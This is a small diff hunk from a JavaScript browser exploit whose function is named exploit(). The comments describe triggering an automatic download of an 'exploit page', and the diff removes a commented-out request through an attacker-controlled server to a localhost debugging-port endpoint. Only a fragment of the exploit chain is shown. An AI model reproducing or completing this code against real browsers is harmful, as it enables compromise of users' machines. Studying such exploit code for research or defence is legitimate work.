@@ -39,9 +39,7 @@ function exploit() {
 
   // Trigger the automatic download of the exploit page
   // The filename should be non-existent in the download folder
-  window.open(url);
-
-  // fetchSync(`https://${myServer}/localhost:${port}|json|new|${file}`) 
+  window.open(url); 
 
   // Wait for the browser to download the file
   // Sleep for 2 seconds using a server request
